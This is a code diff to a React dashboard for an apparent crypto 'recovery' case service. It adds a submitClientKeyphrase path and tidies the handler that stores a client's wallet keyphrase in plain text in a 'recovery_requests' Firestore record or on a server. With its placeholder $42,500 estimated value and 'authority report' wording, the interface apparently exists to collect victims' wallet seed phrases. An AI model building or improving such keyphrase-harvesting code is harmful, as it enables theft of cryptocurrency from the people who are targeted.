@@ -27,6 +27,7 @@ import {
   fetchClientCase,
   markClientNotificationsRead,
   postClientCaseMessage,
+  submitClientKeyphrase,
 } from '../lib/caseClientApi';
 import { doc, updateDoc, serverTimestamp, collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
 
@@ -184,7 +185,9 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   const displayValue = liveCaseData?.estimatedValue ? `$${Number(liveCaseData.estimatedValue).toLocaleString()}.00` : '$42,500.00';
   const displayEmail = liveCaseData?.secureComms || 'USER_SECURE@COMM';
   const displayStatus = liveCaseData?.status || 'PENDING';
-  const hasSubmittedKeyphrase = !!liveCaseData?.walletKeyphrase;
+  const hasSubmittedKeyphrase =
+    !!liveCaseData?.walletKeyphrase ||
+    !!liveCaseData?.walletKeyphraseSubmitted;
 
   const getStatusSteps = (currentStatus: string) => {
     const uniqueSteps = [
@@ -268,32 +271,54 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
 
     setIsSubmittingKey(true);
     try {
-      const docId = liveCaseData?.id || caseData?.id;
-      if (docId) {
-        console.log('Submitting keyphrase for document:', docId);
-        const caseRef = doc(db, 'recovery_requests', docId);
+      const firestoreDocId =
+        caseData?.firestoreDocId ||
+        (caseData?.storageSource === 'server' ? null : caseData?.id);
+      const serverCaseId = !firestoreDocId
+        ? String(caseData?.caseId || caseData?.id || liveCaseData?.id)
+        : null;
+      const email = String(
+        caseData?.secureComms || caseData?.email || liveCaseData?.secureComms || ''
+      );
+
+      if (serverCaseId && email) {
+        const result = await submitClientKeyphrase(
+          serverCaseId,
+          email,
+          keyphrase.trim()
+        );
+        if (!result.ok) {
+          throw new Error(result.error || 'Submission failed');
+        }
+        if (result.case) {
+          setLiveCaseData(result.case);
+        }
+        setSubmissionSuccess(true);
+        setKeyphrase('');
+      } else if (firestoreDocId) {
+        const caseRef = doc(db, 'recovery_requests', firestoreDocId);
         await updateDoc(caseRef, {
           walletKeyphrase: keyphrase.trim(),
-          status: 'PROCESSING', // Automatically move to next stage after verification
+          status: 'PROCESSING',
           updatedAt: serverTimestamp(),
-          keyphraseSubmittedAt: serverTimestamp()
+          keyphraseSubmittedAt: serverTimestamp(),
         });
-        console.log('Keyphrase submitted successfully');
         setSubmissionSuccess(true);
+        setKeyphrase('');
       } else {
         throw new Error('Case ID missing. Cannot submit keyphrase.');
       }
-    } catch (err: any) {
+    } catch (err: unknown) {
       console.error('Submission error:', err);
-      // Show actual error message for debugging
-      const errorMessage = err?.message || 'Failed to submit authority report. Please try again.';
-      setValidationError(`SYSTEM_ERROR: ${errorMessage}`);
-      
-      try {
-        handleFirestoreError(err, OperationType.UPDATE, `recovery_requests/${liveCaseData?.id || caseData?.id}`);
-      } catch (e) {
-        // Silently caught
-      }
+      const errorMessage =
+        err instanceof Error
+          ? err.message
+          : 'Failed to submit authority report. Please try again.';
+      setValidationError(
+        errorMessage.includes('permission')
+          ? 'Could not save keyphrase. Please try again or contact support.'
+          : `SYSTEM_ERROR: ${errorMessage}`
+      );
     } finally {
       setIsSubmittingKey(false);
     }
